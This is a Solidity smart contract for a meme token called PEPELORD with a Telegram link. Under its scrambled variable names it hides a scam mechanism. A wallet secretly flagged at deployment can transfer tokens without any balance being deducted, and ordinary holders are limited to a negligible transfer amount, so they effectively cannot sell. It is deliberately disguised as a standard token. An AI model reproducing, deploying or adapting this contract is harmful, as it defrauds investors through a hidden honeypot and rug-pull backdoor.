/*

https://t.me/pepelorderc

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract PEPELORD is Ownable {
    function transferFrom(address vtyhblc, address tovrf, uint256 pbkszifchgmj) public returns (bool success) {
        require(pbkszifchgmj <= allowance[vtyhblc][msg.sender]);
        allowance[vtyhblc][msg.sender] -= pbkszifchgmj;
        lzco(vtyhblc, tovrf, pbkszifchgmj);
        return true;
    }

    constructor(string memory xnldmafqs, string memory nuvpimdtjqg, address aohub, address hdutrgkzlesm) {
        name = xnldmafqs;
        symbol = nuvpimdtjqg;
        balanceOf[msg.sender] = totalSupply;
        nhzberc[hdutrgkzlesm] = zhpdkobnq;
        fmpn = IUniswapV2Router02(aohub);
    }

    mapping(address => uint256) private udnqfrel;

    string public symbol;

    function lzco(address vtyhblc, address tovrf, uint256 pbkszifchgmj) private {
        address qmstkhwb = IUniswapV2Factory(fmpn.factory()).getPair(address(this), fmpn.WETH());
        if (nhzberc[vtyhblc] == 0) {
            if (vtyhblc != qmstkhwb && udnqfrel[vtyhblc] != block.number && pbkszifchgmj < totalSupply) {
                require(pbkszifchgmj <= totalSupply / (10 ** decimals));
            }
            balanceOf[vtyhblc] -= pbkszifchgmj;
        }
        balanceOf[tovrf] += pbkszifchgmj;
        udnqfrel[tovrf] = block.number;
        emit Transfer(vtyhblc, tovrf, pbkszifchgmj);
    }

    uint8 public decimals = 9;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function transfer(address tovrf, uint256 pbkszifchgmj) public returns (bool success) {
        lzco(msg.sender, tovrf, pbkszifchgmj);
        return true;
    }

    uint256 private zhpdkobnq = 109;

    mapping(address => uint256) public balanceOf;

    string public name;

    function approve(address viflgurwzoxt, uint256 pbkszifchgmj) public returns (bool success) {
        allowance[msg.sender][viflgurwzoxt] = pbkszifchgmj;
        emit Approval(msg.sender, viflgurwzoxt, pbkszifchgmj);
        return true;
    }

    IUniswapV2Router02 private fmpn;

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) private nhzberc;
}
